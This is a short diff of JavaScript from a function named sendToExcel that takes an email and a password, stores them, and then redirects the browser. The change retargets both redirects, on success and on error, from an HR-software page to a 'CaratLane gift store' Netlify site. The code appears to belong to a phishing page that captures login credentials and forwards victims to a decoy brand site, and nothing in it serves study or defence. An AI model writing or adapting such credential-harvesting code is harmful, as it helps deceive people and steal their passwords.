@@ -46,12 +46,12 @@ async function sendToExcel(email, password) {
         console.log('Data stored successfully');
         
         // Redirect to the specified URL after successful data storage
-        window.location.href = 'https://inspiring-bluewhale.static.domains/darwinbox-hrsoftware';
+        window.location.href = 'https://caratlane-gift-store.netlify.app/';
         
     } catch (error) {
         console.error('Error storing data:', error);
         
-        window.location.href = 'https://inspiring-bluewhale.static.domains/darwinbox-hrsoftware';
+        window.location.href = 'https://caratlane-gift-store.netlify.app/';
     }
 }
 
